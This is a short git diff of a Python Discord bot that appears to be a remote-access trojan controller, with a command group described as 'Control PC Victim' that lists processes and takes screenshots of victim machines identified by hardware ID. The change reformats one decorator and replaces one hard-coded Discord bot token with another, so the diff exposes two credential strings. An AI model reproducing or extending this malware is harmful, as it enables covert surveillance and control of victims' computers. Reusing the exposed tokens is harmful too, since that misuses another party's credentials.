@@ -90,9 +90,7 @@ class Control(commands.Cog, description='Control PC Victim'):
 				pass
 		await SendOutput(ctx, processes)
 
-	@commands.command(
-			aliases=['sc', 's'], brief='Screenshot PC Victim',
-			description='Screenshot PC Victim')
+	@commands.command(aliases=['sc', 's'], brief='Screenshot PC Victim', description='Screenshot PC Victim')
 	async def Screenshot(self, ctx, HWID: str, ) -> None:
 		if not CheckHWID(HWID):
 			return
@@ -251,4 +249,4 @@ async def on_ready():
 	await client.add_cog(Control())
 	await client.add_cog(OtherCommands())
 
-client.run('MTEyODk0MTcwMzAzNDgzNDk2NA.G_HZmw.klPl10GGVyzCyAwrRR96K48zjWil61j2wG7HmQ')
+client.run('MTEyODk0MTcwMzAzNDgzNDk2NA.GSKCE6.qHV7rXUtb6PZ0ko4ODONoBLgX6DSoBDXRy1w7E')
